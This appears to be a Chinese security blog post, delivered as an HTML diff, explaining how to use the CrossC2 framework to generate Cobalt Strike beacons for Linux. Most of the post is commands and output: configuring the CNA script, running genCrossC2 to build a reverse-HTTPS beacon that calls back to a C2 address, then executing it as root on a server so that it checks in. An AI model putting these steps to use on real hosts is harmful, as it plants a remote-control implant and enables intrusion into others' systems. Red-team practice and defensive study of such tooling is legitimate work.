@@ -1,0 +1,298 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>CobaltStrike 上线Linux主机 | Wu1alaのBlog</title>
+  <meta name="author" content="Wu1ala">
+  
+  <meta name="description" content="xxxxx">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="CobaltStrike 上线Linux主机"/>
+  <meta property="og:site_name" content="Wu1alaのBlog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Wu1alaのBlog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> CobaltStrike 上线Linux主机</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>CrossC2 framework - 生成CobaltStrike的跨平台beacon</p>
+<span id="more"></span>
+
+<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p>
+<h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>首先下载CrossC2，修改cna文件中的<code>CC2_PATH</code>与<code>CC2_BIN</code>的绝对路径，他们分别代表CrossC2的根路径与genCross.xxx的路径，后续生成payload要用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">menubar(<span class="string">&quot;CrossC2&quot;</span>, <span class="string">&quot;generator&quot;</span>, 2);</span><br><span class="line"></span><br><span class="line"><span class="variable">$CC2_PATH</span> = <span class="string">&quot;/Users/wulala/tools/CS/cs4.3/linux/CrossC2Kit/&quot;</span>; <span class="comment"># &lt;-------- fix</span></span><br><span class="line"><span class="variable">$CC2_BIN</span> = <span class="string">&quot;genCrossC2.MacOS&quot;</span>;</span><br><span class="line"></span><br><span class="line">popup generator &#123;</span><br><span class="line">    menu <span class="string">&quot;&amp;Create CrossC2 Listener&quot;</span> &#123;</span><br><span class="line">        item <span class="string">&quot;&amp;Create reverse HTTPS Listener&quot;</span> &#123;</span><br><span class="line">            createCrossC2Listener(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>讲CS服务端的<code>.cobaltstrike.beacon_keys</code>拷贝到C端的文件下（要和genCrossC2.MacOS在同目录）</p>
+<p><img src="image-20220109201056248.png"></p>
+<p>然后在CS中加载CrossC2.cna，工具栏会出现CrossC2选项卡</p>
+<p><img src="image-20220109200624913.png"></p>
+<p>创建https Listener</p>
+<p><img src="image-20220109201157338.png"></p>
+<p>启动CrossC2-Linstener,配置好监听器与导出路径即可。</p>
+<p><img src="image-20220109201954944.png"></p>
+<p>查看日志成功创建</p>
+<p><img src="image-20220109201552123.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*** /Users/wulala/tools/CS/cs4.3/linux/CrossC2Kit/genCrossC2.MacOS 192.168.100.222 443 /Users/wulala/tools/CS/cs4.3/linux/CrossC2Kit/.cobaltstrike.beacon_keys null Linux x64 /tmp/linux-test</span><br><span class="line">*** genCrossC2 beacon -&gt; *[success] :  Packed 1363808 byte.</span><br><span class="line">*** /Users/wulala/tools/CS/cs4.3/linux/CrossC2Kit/genCrossC2.MacOS 192.168.100.222 443 /Users/wulala/tools/CS/cs4.3/linux/CrossC2Kit/.cobaltstrike.beacon_keys null Linux-lib x64 /tmp/linux-test.lib</span><br><span class="line">*** genCrossC2 libbeacon -&gt; *[success] : Packed 2725144 byte.</span><br><span class="line">*** ahahahaha hosted CrossC2 beacon: reverse-https Linux x64 &#123; https &#125;[https] @ https://192.168.100.222:55413/tXdrgqQouY</span><br><span class="line">*** create listener: CrossC2 beacon: reverse-https Linux x64 &#123; https &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看导出位置，生成了linux-test，文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╭─wulala@wulaladeMacBook-Pro /tmp</span><br><span class="line">╰─$ ls -l</span><br><span class="line">-rwxr-xr-x  1 wulala  wheel  1363808  1  9 20:19 linux-test</span><br><span class="line">-rwxr-xr-x  1 wulala  wheel  2725144  1  9 20:19 linux-test.lib</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>讲文件上传到linux服务器，然后./执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@wulala:/home<span class="comment"># ./linux-test  </span></span><br><span class="line">root@wulala:/home<span class="comment"># ps -ef | grep linux-test  </span></span><br><span class="line">root     24241     1 54 20:23 ?        00:00:03 ./linux-test</span><br><span class="line">root     24249  2832  0 20:23 pts/0    00:00:00 grep linux-test</span><br><span class="line">root@wulala:/home<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<p>成功上线</p>
+<p><img src="image-20220109202450606.png"></p>
+<h3 id="命令行生成方式"><a href="#命令行生成方式" class="headerlink" title="命令行生成方式"></a>命令行生成方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./genCrossC2.MacOS xx.xx.xx.xx 443 .cobaltstrike.beacon_keys null Linux x64 /tmp/linux-test</span><br></pre></td></tr></table></figure>
+
+	  
+	</div>
+
+	
+	<span id="/2022/01/09/CobaltStrike-%E4%B8%8A%E7%BA%BFLinux%E4%B8%BB%E6%9C%BA/" class="leancloud-visitors view" data-flag-title="CobaltStrike 上线Linux主机">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/12/20/CVE-2019-5736/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-01-09 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CobaltStrike/">CobaltStrike<span>1</span></a></li> <li><a href="/tags/Linux/">Linux<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 Wu1ala's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+   </html>
